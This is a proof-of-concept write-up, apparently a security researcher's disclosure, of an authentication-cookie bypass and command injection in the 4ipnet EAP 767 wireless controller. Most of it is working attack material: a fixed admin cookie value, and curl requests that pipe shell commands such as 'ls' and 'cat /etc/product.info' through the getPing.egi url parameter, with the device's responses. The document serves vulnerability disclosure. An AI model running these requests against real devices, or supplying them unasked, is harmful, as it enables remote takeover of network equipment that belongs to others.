# PoC for 4ipnet EAP 767

```zsh!
❯ curl -I http://{host}/
HTTP/1.1 302 Moved Temporarily
Date: Mon, 15 Jan 2024 01:10:14 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
ETag: "29e-122-2b9cb3e0"
Content-length: 88
Connection: keep-alive
Keep-Alive: timeout=60, max=100
Location: http://{host}/login.asp
```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_1ab1ac81f80c42b992f6c4fc96be40e8.png)

After accessing the login web page, it was discovered to be a 4ipnet wireless network controller
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_247c7496749603bc7b9772d11afd7ba4.png)


**Search online articles to obtain the default password for the device.**

**Web console features**

Overview
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_fa6cb02d32f831033c013c4142586a4f.png)

The management interface has the Home > Utilities > Network Utilities feature, allowing network tests such as ping, tracert, arping, etc., to be performed through the web page
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_9925e6bd58df1d54d022f404504adbef.png)

## Exploit PoC
**PoC I @ Browser**

The front-end performs input text validation to check whether the input text is compliant
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_0d41715f59b4037ce1b9dcea6c9d31ce.png)

Turn to the backend, verify HTTP request characteristics from the network
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_b87e4fa1fea137d1feba67001f4ca104.png)
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_354d5ac2dd8284e800fa818cf166f489.png)


http request characteristics
```asp!
# request 1
http://{host}/getPing.egi?url=127.0.0.1

# request 2
http://{host}/getPing.egi?pid=940
```
> It can be observed that its ping function first sends the url as a query string parameter, obtains the pid, then retrieves ping output in batches through the pid parameter, and finally presents the results on the web page

It was found that the management interface relies solely on the cookie name/value as the basis for user identification
| Name | Value |
| -------- | -------- |
| username     | admin    |
| password     |  17lgP6vqCV1Ko   |

:::danger
Using the same set of credentials (admin), regardless of how many times you log in, the content of the cookie remains unchanged:::

![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_3ecdb0b545bf10be16816293036534e8.png)


**PoC II @ cmd**

Using the curl tool to simulate an HTTP request to access the management interface home page, it was redirected to the login page
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_f3925ef9b1edaae1b762ad800322d80d.png)

Using the curl tool to simulate an HTTP request and including the aforementioned obtained cookie, it was confirmed that access to the authenticated management interface home page is possible
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_a76b368249757b325d6f3bcc4ab24d88.png)

Attempted to access the `getPing.egi` page and escape the query string parameter url using special characters (;, |) in an attempt to evade security and inject a specified command
**Attemp I with `;`**
Detected as invalid characters by the backend program.
```zsh!
❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1;"
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2024 01:49:25 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
Content-type: text/html
Content-length: 29
Connection: keep-alive
Keep-Alive: timeout=60, max=100

Illegal Characters of URL.
OK%                              
```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_6b5b52a9a94d27f7ace8850892ba7f77.png)

**Attemp II with `|`**
Successful escape!!! and obtained pid!!!

```zsh!
❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1|"
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2024 01:52:49 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
Content-type: text/html
Content-length: 4
Connection: keep-alive
Keep-Alive: timeout=60, max=100

3704%      
```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_77cdaa3fe2e0c85b8506ec8aa926a65b.png)

Inject Target with `ls` to list the current directory.
```zsh!
 curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls"
 ```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_686276a082e16b2f204e75e987d55b0f.png)

Inject Target with `ls -l` to display the current directory structure, file permissions, file types, modification dates, and other information."
```zsh!
 curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls%20-l"
 ```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_caee4f89b8ef4271c2f50521c479fe61.png)


>Confirmed the presence of a Remote Code Execution (RCE) vulnerability in the product. Arbitrary commands can be executed by passing the url parameter: input_text + pipe + command

## Verify the device brand and model.
```zsh!
curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
```
![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_c8581cfbd913fe193766cbad839cefc7.png)
## Reference
https://hkitblog.com/12770/
https://www.lienshen.com.tw/sidebar1_01-2-11.html
https://www.netadmin.com.tw/netadmin/zh-tw/snapshot/0E91A5D929C04C40AB6A6B88592725E1
